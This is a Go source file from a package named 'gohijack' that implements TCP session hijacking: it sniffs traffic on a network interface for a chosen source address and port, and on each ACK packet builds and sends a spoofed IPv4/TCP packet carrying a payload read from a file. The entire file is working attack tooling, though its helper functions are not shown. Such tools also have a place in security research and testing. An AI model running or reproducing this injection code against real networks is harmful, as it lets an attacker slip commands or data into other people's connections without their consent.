package gohijack

import (
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
)

func doHijack(packet gopacket.Packet, payload []byte) (err error) {
	connection, err := NewConnectionFromPacket(packet)
	if err != nil {
		return
	}
	tcpLayer, ipv4Layer, err := connection.GenerateLayers(payload)
	if err != nil {
		return
	}
	buf, err := connection.Serialize(tcpLayer, ipv4Layer, payload)
	if err != nil {
		return
	}
	err = connection.SendIP(buf)
	if err != nil {
		return
	}
	return
}

func Hijack(interfaceName string, srcIp string, srcPort uint32, dstIp string, dstPort uint, payloadFile string, once bool) (err error) {
	payload, err := os.ReadFile(payloadFile)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	sniffer := PureGo{}
	filter, err := GenerateFilter(srcIp, srcPort)
	if err != nil {
		return
	}
	packets, err := sniffer.Sniff(interfaceName, filter)
	if err != nil {
		return
	}
	for packet := range packets {
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		tcp, _ := tcpLayer.(*layers.TCP)
		if tcp.ACK {
			err = doHijack(packet, payload)
			if err != nil {
				continue
			}
			if once {
				return
			}
		}
	}
	return
}
